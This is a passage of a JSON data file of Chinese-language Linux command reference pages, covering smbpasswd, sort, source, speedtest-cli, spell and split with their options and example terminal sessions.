        "body": "<h1 id=\"smbpasswd\">smbpasswd</h1>\n<p>samba用户和密码管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>smbpasswd命令</strong> 属于samba套件，能够实现添加或删除samba用户和为用户修改密码。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">smbpasswd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：向smbpasswd文件中添加用户；</span>\n<span class=\"hljs-deletion\">-c：指定samba的配置文件；</span>\n<span class=\"hljs-deletion\">-x：从smbpasswd文件中删除用户；</span>\n<span class=\"hljs-deletion\">-d：在smbpasswd文件中禁用指定的用户；</span>\n<span class=\"hljs-deletion\">-e：在smbpasswd文件中激活指定的用户；</span>\n<span class=\"hljs-deletion\">-n：将指定的用户的密码置空。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：指定要修改SMB密码的用户。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sort",
        "des": "对文本文件中所有行进行排序。",
        "body": "<h1 id=\"sort\">sort</h1>\n<p>对文本文件中所有行进行排序。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">sort</span> [OPTION]... [<span class=\"hljs-keyword\">FILE</span>]...\n<span class=\"hljs-keyword\">sort</span> [OPTION]... --files0-<span class=\"hljs-keyword\">from</span>=F\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>将所有输入文件的内容排序后并输出。</li>\n<li>当没有文件或文件为<code>-</code>时，读取标准输入。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<p>排序选项：</p>\n<pre><code class=\"language-shell\">-b, <span class=\"hljs-params\">--ignore-leading-blanks</span>    忽略开头的空白。\n-d, <span class=\"hljs-params\">--dictionary-order</span>         仅考虑空白、字母、数字。\n-f, <span class=\"hljs-params\">--ignore-case</span>              将小写字母作为大写字母考虑。\n-g, <span class=\"hljs-params\">--general-numeric-sort</span>     根据数字排序。\n-i, <span class=\"hljs-params\">--ignore-nonprinting</span>       排除不可打印字符。\n-M, <span class=\"hljs-params\">--month-sort</span>               按照非月份、一月、十二月的顺序排序。\n-h, <span class=\"hljs-params\">--human-numeric-sort</span>       根据存储容量排序<span class=\"hljs-params\">(注意使用大写字母，例如：2K 1G)</span>。\n-n, <span class=\"hljs-params\">--numeric-sort</span>             根据数字排序。\n-R, <span class=\"hljs-params\">--random-sort</span>              随机排序，但分组相同的行。\n<span class=\"hljs-params\">--random-source=FILE</span>           从FILE中获取随机长度的字节。\n-r, <span class=\"hljs-params\">--reverse</span>                  将结果倒序排列。\n<span class=\"hljs-params\">--sort=WORD</span>                    根据WORD排序，其中: general-numeric 等价于 -g，human-numeric 等价于 -h，month 等价于 -M，numeric 等价于 -n，random 等价于 -R，<span class=\"hljs-keyword\">version</span> 等价于 -V。\n-V, <span class=\"hljs-params\">--version-sort</span>             文本中<span class=\"hljs-params\">(版本)</span>数字的自然排序。\n</code></pre>\n<p>其他选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">--batch-size</span>=NMERGE                    一次合并最多NMERGE个输入；超过部分使用临时文件。\n-c, --check, <span class=\"hljs-attribute\">--check</span>=diagnose-first    检查输入是否已排序，该操作不会执行排序。\n-C, <span class=\"hljs-attribute\">--check</span>=quiet, <span class=\"hljs-attribute\">--check</span>=silent      类似于 -c 选项，但不输出第一个未排序的行。\n<span class=\"hljs-attribute\">--compress-program</span>=PROG                使用PROG压缩临时文件；使用PROG -d解压缩。\n--<span class=\"hljs-built_in\">debug</span>                                注释用于排序的行，发送可疑用法的警报到stderr。\n<span class=\"hljs-attribute\">--files0-from</span>=F                        从文件F中读取以NUL结尾的所有文件名称；如果F是 - ，那么从标准输入中读取名字。\n-k, <span class=\"hljs-attribute\">--key</span>=KEYDEF                       通过一个key排序；KEYDEF给出位置和类型。\n-m, --merge                            合并已排序文件，之后不再排序。\n-o, <span class=\"hljs-attribute\">--output</span>=FILE                      将结果写入FILE而不是标准输出。\n-s, --stable                           通过禁用最后的比较来稳定排序。\n-S, <span class=\"hljs-attribute\">--buffer-size</span>=SIZE                 使用SIZE作为内存缓存大小。\n-t, <span class=\"hljs-attribute\">--field-separator</span>=SEP              使用SEP作为列的分隔符。\n-T, <span class=\"hljs-attribute\">--temporary-directory</span>=DIR          使用DIR作为临时目录，而不是 <span class=\"hljs-variable\">$TMPDIR</span> 或 /tmp；多次使用该选项指定多个临时目录。\n<span class=\"hljs-attribute\">--parallel</span>=N                           将并发运行的排序数更改为N。\n-u, --unique                           同时使用-c，严格检查排序；不同时使用-c，输出排序后去重的结果。\n-z, --zero-terminated                  设置行终止符为NUL（空），而不是换行符。\n--help                                 显示帮助信息并退出。\n--version                              显示版本信息并退出。\n\n\nKEYDEF的格式为：F[.C][OPTS][,F[.C][OPTS]] ，表示开始到结束的位置。\nF表示列的编号\nC表示\nOPTS为[bdfgiMhnRrV]中的一到多个字符，用于覆盖当前排序选项。\n使用--debug选项可诊断出错误的用法。\n\n\nSIZE 可以有以下的乘法后缀:\n% 内存的1%；\nb 1；\nK 1024（默认）；\n剩余的 M, G, T, P, E, Z, Y 可以类推出来。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要处理的文件，可以为任意数量。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<p>sort将文件/文本的每一行作为一个单位相互比较，比较原则是从首字符向后依次按ASCII码值进行比较，最后将他们按升序输出。</p>\n<pre><code class=\"language-shell\">root@[mail text]<span class=\"hljs-meta\"># cat sort.txt</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">1.1</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">4.4</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">2.2</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n\n[root@mail text]<span class=\"hljs-meta\"># sort sort.txt</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">1.1</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">2.2</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">4.4</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n</code></pre>\n<p>忽略相同行使用<code>-u</code>选项或者<code>uniq</code>：</p>\n<pre><code class=\"language-shell\">[root@mail text]<span class=\"hljs-meta\"># cat sort.txt</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">1.1</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">4.4</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">2.2</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n\n[root@mail text]<span class=\"hljs-meta\"># sort -u sort.txt</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">1.1</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">2.2</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">4.4</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n\n[root@mail text]<span class=\"hljs-meta\"># uniq sort.txt</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">1.1</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">4.4</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">2.2</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">5.5</span>\n</code></pre>\n<p><code>sort</code>的<code>-n、-r、-k、-t</code>选项的使用：</p>\n<pre><code class=\"language-shell\">[root@mail text]<span class=\"hljs-meta\"># cat sort.txt</span>\n<span class=\"hljs-symbol\">AAA:</span>BB:CC\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">1.6</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">4.2</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">2.5</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">5.4</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">60</span>:<span class=\"hljs-number\">5.1</span>\n\n<span class=\"hljs-meta\"># 将BB列按照数字从小到大顺序排列：</span>\n[root@mail text]<span class=\"hljs-meta\"># sort -nk 2 -t: sort.txt</span>\n<span class=\"hljs-symbol\">AAA:</span>BB:CC\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">2.5</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">4.2</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">1.6</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">5.4</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">60</span>:<span class=\"hljs-number\">5.1</span>\n\n<span class=\"hljs-meta\"># 将CC列数字从大到小顺序排列：</span>\n<span class=\"hljs-meta\"># -n是按照数字大小排序，-r是以相反顺序，-k是指定需要排序的栏位，-t指定栏位分隔符为冒号</span>\n[root@mail text]<span class=\"hljs-meta\"># sort -nrk 3 -t: sort.txt</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">5.4</span>\n<span class=\"hljs-symbol\">eee:</span><span class=\"hljs-number\">60</span>:<span class=\"hljs-number\">5.1</span>\n<span class=\"hljs-symbol\">ddd:</span><span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">4.2</span>\n<span class=\"hljs-symbol\">ccc:</span><span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">3.3</span>\n<span class=\"hljs-symbol\">bbb:</span><span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">2.5</span>\n<span class=\"hljs-symbol\">aaa:</span><span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">1.6</span>\n<span class=\"hljs-symbol\">AAA:</span>BB:CC\n</code></pre>\n<p>关于<code>-k</code>选项的解读和例子：</p>\n<p>-k选项深度解读：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">FStart</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">CStart</span> <span class=\"hljs-comment\">Modifier</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">FEnd</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">CEnd</span> <span class=\"hljs-comment\">Modifier</span>\n--<span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">Start</span>--<span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-string\">,</span>--<span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">End</span>--<span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>\n <span class=\"hljs-comment\">FStart</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">CStart</span> <span class=\"hljs-comment\">选项</span>  <span class=\"hljs-string\">,</span>  <span class=\"hljs-comment\">FEnd</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">CEnd</span> <span class=\"hljs-comment\">选项</span>\n</code></pre>\n<p>这个语法格式可以被其中的逗号<code>,</code>分为两大部分，<strong>Start</strong> 部分和 <strong>End</strong> 部分。\nStart部分由三部分组成，其中的Modifier部分就是我们之前说过的选项部分；\n我们重点说说<code>Start</code>部分的<code>FStart</code>和<code>C.Start</code>；<code>C.Start</code>是可以省略的，省略的话就表示从本域的开头部分开始。<code>FStart.CStart</code>，其中<code>FStart</code>就是表示使用的域，而<code>CStart</code>则表示在<code>FStart</code>域中从第几个字符开始算排序首字符。\n同理，在End部分中，你可以设定<code>FEnd.CEnd</code>，如果你省略<code>.CEnd</code>或将它设定为0，则表示结尾到本域的最后一个字符。</p>\n<p>例子：从公司英文名称的第二个字母开始排序：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">$</span> <span class=\"hljs-string\">sort</span> <span class=\"hljs-string\">-t</span> <span class=\"hljs-string\">' '</span> <span class=\"hljs-string\">-k</span> <span class=\"hljs-number\">1.2</span> <span class=\"hljs-string\">facebook.txt</span>\n<span class=\"hljs-string\">baidu</span> <span class=\"hljs-number\">100</span> <span class=\"hljs-number\">5000</span>\n<span class=\"hljs-string\">sohu</span> <span class=\"hljs-number\">100</span> <span class=\"hljs-number\">4500</span>\n<span class=\"hljs-string\">google</span> <span class=\"hljs-number\">110</span> <span class=\"hljs-number\">5000</span>\n<span class=\"hljs-string\">guge</span> <span class=\"hljs-number\">50</span> <span class=\"hljs-number\">3000</span>\n</code></pre>\n<p>解读：使用了<code>-k 1.2</code>，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现baidu因为第二个字母是a而名列榜首。sohu和google第二个字符都是o，但sohu的h在google的o前面，所以两者分别排在第二和第三。guge只能屈居第四了。</p>\n<p>例子：只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序：</p>\n<pre><code class=\"language-shell\">$ sort -t ' ' -k <span class=\"hljs-number\">1.2,1.2</span> -nrk <span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">3</span> facebook.txt\nbaidu <span class=\"hljs-number\">100 5000</span>\ngoogle <span class=\"hljs-number\">110 5000</span>\nsohu <span class=\"hljs-number\">100 4500</span>\nguge <span class=\"hljs-number\">50</span> <span class=\"hljs-number\">3000</span>\n</code></pre>\n<p>解读：由于只对第二个字母进行排序，所以我们使用了<code>-k 1.2,1.2</code>的表示方式，表示我们只对第二个字母进行排序（如果你问我使用<code>-k 1.2</code>怎么不行？当然不行，因为你省略了End部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。\n对员工工资进行排序，我们也使用了<code>-k 3,3</code>，这是最准确的表述，表示我们只对本域进行排序，因为如果你省略了后面的3，就变成了我们对第3个域开始到最后一个域位置的内容进行排序了。</p>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p><a href=\"https://stackoverflow.com/questions/1255782/whats-the-difference-between-general-numeric-sort-and-numeric-sort-options\">关于-g和-n选项的区别：stackoverflow</a></p>\n</li>\n<li><p>关于这个复杂命令的学习，建议您阅读info文档及参考博客、问答网站等。</p>\n</li>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 shuf</code>，<code>info coreutils 'shuf invocation'</code>。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "source",
        "des": "在当前Shell环境中从指定文件读取和执行命令。",
        "body": "<h1 id=\"source\">source</h1>\n<p>在当前Shell环境中从指定文件读取和执行命令。</p>\n<h3 id=\"概要\">概要</h3>\n<p>source filename [arguments]</p>\n<h3 id=\"主要用途\">主要用途</h3>\n<ul>\n<li>执行文件并从文件中加载变量及函数到执行环境</li>\n</ul>\n<h4 id=\"参数\">参数</h4>\n<p>filename：要执行的文件</p>\n<p>arguments（可选）：传递给文件的参数</p>\n<h4 id=\"返回值\">返回值</h4>\n<p>source返回文件最后一个命令的返回值，如果文件不能读取则会失败</p>\n<h4 id=\"错误用法\">错误用法</h4>\n<ul>\n<li><p>文件在<code>$PATH</code>中找不到。</p>\n</li>\n<li><p>文件未给出。</p>\n</li>\n</ul>\n<h3 id=\"例子\">例子</h3>\n<ul>\n<li><p>在一些工具的执行过程中，会把环境变量设置以\"export XXX=XXXXXX\"或\"declare XXX=XXXXXX\"的形式导出到\n一个文件中，然后用source加载该文件内容到执行环境中。</p>\n</li>\n<li><p>读取和执行/root/.bash_profile文件。</p>\n</li>\n</ul>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># source ~/.bash_profile</span>\n</code></pre>\n<h3 id=\"qa\">Q&amp;A</h3>\n<p>Q：<code>source</code>和<code>sh</code>在执行文件方面有什么区别？</p>\n<p>A：<code>sh</code>的执行是在子shell中，<code>source</code>会使得被执行文件的变量及函数加载进当前终端环境内（除去函数内local修饰的变量等）；建议您参考<code>export</code>命令的 <strong>知识点</strong> 部分</p>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看 <code>help</code> 命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "speedtest-cli",
        "des": "命令行下测试服务器外网速度",
        "body": "<h1 id=\"speedtest-cli\">speedtest-cli</h1>\n<p>命令行下测试服务器外网速度</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>speedtest-cli</strong> 是一个使用python编写的命令行脚本，通过调用speedtest.net测试上下行的接口来完成速度测试，最后我会测试运维生存时间所在服务器的外网速度。项目地址：<a href=\"https://github.com/sivel/speedtest-cli\">https://github.com/sivel/speedtest-cli</a></p>\n<h3 id=\"安装speedtest－cli\">安装speedtest－cli</h3>\n<p>speedtest-cli需要在python 2.4-3.4的环境下，安装方法都很简单，自己选择以下最适合你的一种。</p>\n<p> <strong>pip方式</strong> </p>\n<pre><code class=\"language-shell\">＃ pip install speedtest－<span class=\"hljs-keyword\">cli</span>\n</code></pre>\n<p> <strong>easy_install方式</strong> </p>\n<pre><code class=\"language-shell\">＃ easy_install speedtest-<span class=\"hljs-keyword\">cli</span>\n</code></pre>\n<p> <strong>github＋pip方式</strong> </p>\n<pre><code class=\"language-shell\">＃ pip install git+https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/sivel/</span>speedtest-cli.git\n</code></pre>\n<p>或者</p>\n<pre><code class=\"language-shell\">＃ git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/sivel/</span>speedtest-cli.git\n＃ python speedtest-cli/setup.py install\n</code></pre>\n<p> <strong>下载脚本方式</strong> </p>\n<pre><code class=\"language-shell\">＃ wget -O speedtest-cli https:<span class=\"hljs-regexp\">//</span>raw.github.com<span class=\"hljs-regexp\">/sivel/</span>spe ... er/speedtest_cli.py\n＃ chmod +x speedtest-cli\n</code></pre>\n<p>或者</p>\n<pre><code class=\"language-shell\">＃ curl -o speedtest-cli https:<span class=\"hljs-regexp\">//</span>raw.github.com<span class=\"hljs-regexp\">/sivel/</span>spe ... er/speedtest_cli.py\n＃ chmod +x speedtest-cli\n</code></pre>\n<p>直接下载脚本，给予执行权限即可。</p>\n<h3 id=\"用法\">用法</h3>\n<pre><code class=\"language-shell\">-h, --help       show this help message and <span class=\"hljs-keyword\">exit</span>\n--share          分享你的网速，该命令会在speedtest网站上生成网速测试结果的图片。\n--simple         Suppress verbose output, only show basic information\n--list           根据距离显示speedtest.net的测试服务器列表。\n--server=SERVER  指定列表中id的服务器来做测试。\n--mini=MINI      URL of the Speedtest Mini server\n--source=SOURCE  Source ip address to bind to\n--version        Show the version number and <span class=\"hljs-keyword\">exit</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>列出所有在中国的测试服务器：</p>\n<pre><code class=\"language-shell\">[root@li<span class=\"hljs-number\">229-122</span> ~]# speedtest-cli --list | grep China\n<span class=\"hljs-number\">1185</span>) China Unicom (Changchun, China) [<span class=\"hljs-number\">10534.35</span> km]\n<span class=\"hljs-number\">3784</span>) China Mobile (Urumqi, China) [<span class=\"hljs-number\">10581.15</span> km]\n<span class=\"hljs-number\">2667</span>) Beijing Normal University (Beijing, China) [<span class=\"hljs-number\">11117.03</span> km]\n<span class=\"hljs-number\">2529</span>) Beijing Normal University (Beijing, China) [<span class=\"hljs-number\">11117.03</span> km]\n<span class=\"hljs-number\">2816</span>) Capital Online Data service (Beijing, China) [<span class=\"hljs-number\">11117.03</span> km]\n<span class=\"hljs-number\">4354</span>) SXmobile (Taiyuan, China) [<span class=\"hljs-number\">11383.17</span> km]\n<span class=\"hljs-number\">3973</span>) China Telecom (Lanzhou, China) [<span class=\"hljs-number\">11615.43</span> km]\n<span class=\"hljs-number\">3633</span>) China Telecom (Shanghai, China) [<span class=\"hljs-number\">11983.37</span> km]\n<span class=\"hljs-number\">3927</span>) China Mobile Jiangsu Co., Ltd. (Suzhou, China) [<span class=\"hljs-number\">11989.27</span> km]\n<span class=\"hljs-number\">2461</span>) China Unicom (Chengdu, China) [<span class=\"hljs-number\">12213.35</span> km]\n<span class=\"hljs-number\">1028</span>) Shepherd Software (Xiamen, China) [<span class=\"hljs-number\">12785.57</span> km]\n<span class=\"hljs-number\">1628</span>) Xiamen Guangdian Xinxu (Xiamen, China) [<span class=\"hljs-number\">12785.57</span> km]\n<span class=\"hljs-number\">3891</span>) GZinternet (Guangzhou, China) [<span class=\"hljs-number\">13005.36</span> km]\n<span class=\"hljs-number\">3871</span>) SZWCDMA (Shenzhen, China) [<span class=\"hljs-number\">13059.20</span> km]\n<span class=\"hljs-number\">3819</span>) SZU (Shenzhen, China) [<span class=\"hljs-number\">13059.20</span> km]\n<span class=\"hljs-number\">1536</span>) STC (Hong Kong, China) [<span class=\"hljs-number\">13088.37</span> km]\n<span class=\"hljs-number\">1890</span>) Telin (Hong Kong, China) [<span class=\"hljs-number\">13088.37</span> km]\n</code></pre>\n<p> <strong>结果解释</strong> </p>\n<pre><code class=\"language-shell\">3633) China Telecom (Shanghai, China) <span class=\"hljs-selector-attr\">[11983.37 km]</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">3633</span>: 服务器id\n<span class=\"hljs-attribute\">china</span> telecom：isp，这里是中国电信\n<span class=\"hljs-attribute\">shanghai</span>,china ：服务器所在地址\n<span class=\"hljs-attribute\">11983</span>.<span class=\"hljs-number\">37</span> km：两台服务器地理位置之间距离，我这台机器在美国，和上海相距<span class=\"hljs-number\">11983</span>.<span class=\"hljs-number\">37</span>公里，很远呐.\n</code></pre>\n<p> <strong>外网速度测试</strong> </p>\n<pre><code class=\"language-shell\">[root@li229<span class=\"hljs-string\">-122</span> ~]# speedtest-cli --server=3633 --share\nRetrieving speedtest.net configuration...\nRetrieving speedtest.net server list...\n<span class=\"hljs-keyword\">Testing </span>from Linode (173.255.219.122)...\nHosted by China Telecom (Shanghai) [11983.37 km]: 23.603 ms\n<span class=\"hljs-keyword\">Testing </span>download speed........................................\nDownload: 24.84 Mbit/s\n<span class=\"hljs-keyword\">Testing </span>upload speed..................................................\nUpload: 4.57 Mbit/s\nShare results: http://www.speedtest.net/result/3240988007.png\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "spell",
        "des": "对文件进行拼写检查",
        "body": "<h1 id=\"spell\">spell</h1>\n<p>对文件进行拼写检查</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>spell命令</strong> 对文件进行拼写检查，并把拼写错误的单词输出。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">spell</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定需要进行拼写检查的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "split",
        "des": "分割任意大小的文件",
        "body": "<h1 id=\"split\">split</h1>\n<p>分割任意大小的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>split命令</strong> 可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：值为每一输出档案的大小，单位为 byte。</span>\n<span class=\"hljs-deletion\">-C：每一输出档中，单行的最大 byte 数。</span>\n<span class=\"hljs-deletion\">-d：使用数字作为后缀。</span>\n<span class=\"hljs-deletion\">-l：值为每一输出档的行数大小。</span>\n<span class=\"hljs-deletion\">-a：指定后缀长度(默认为2)。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>生成一个大小为100KB的测试文件：</p>\n<pre><code class=\"language-shell\">[root@localhost split]# dd <span class=\"hljs-attribute\">if</span>=/dev/zero <span class=\"hljs-attribute\">bs</span>=100k <span class=\"hljs-attribute\">count</span>=1 <span class=\"hljs-attribute\">of</span>=date.file\n1+0 records <span class=\"hljs-keyword\">in</span>\n1+0 records out\n102400 bytes (102 kB) copied, 0.00043 seconds, 238 MB/s\n</code></pre>\n<p>使用split命令将上面创建的date.file文件分割成大小为10KB的小文件：</p>\n<pre><code class=\"language-shell\">[root@localhost split]# split -b <span class=\"hljs-number\">10</span>k <span class=\"hljs-keyword\">date</span>.<span class=\"hljs-keyword\">file</span> \n[root@localhost split]# <span class=\"hljs-keyword\">ls</span>\n<span class=\"hljs-keyword\">date</span>.<span class=\"hljs-keyword\">file</span>  xaa  xab  xac  xad  xae  xaf  xag  xah  xai  xaj\n</code></pre>\n<p>文件被分割成多个带有字母的后缀文件，如果想用数字后缀可使用-d参数，同时可以使用-a length来指定后缀的长度：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> split]# split -b <span class=\"hljs-number\">10</span>k date.file -d -a <span class=\"hljs-number\">3</span>\n[root<span class=\"hljs-title\">@localhost</span> split]# ls\ndate.file  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">000</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">001</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">002</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">003</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">004</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">005</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">006</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">007</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">008</span>  <span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">009</span>\n</code></pre>\n<p>为分割后的文件指定文件名的前缀：</p>\n<pre><code class=\"language-shell\">[root@localhost split]# split -b <span class=\"hljs-number\">10</span>k <span class=\"hljs-keyword\">date</span>.<span class=\"hljs-keyword\">file</span> -d -a <span class=\"hljs-number\">3</span> split_file\n[root@localhost split]# <span class=\"hljs-keyword\">ls</span>\n<span class=\"hljs-keyword\">date</span>.<span class=\"hljs-keyword\">file</span>  split_file000  split_file001  split_file002  split_file003  split_file004  split_file005  split_file006  split_file007  split_file008  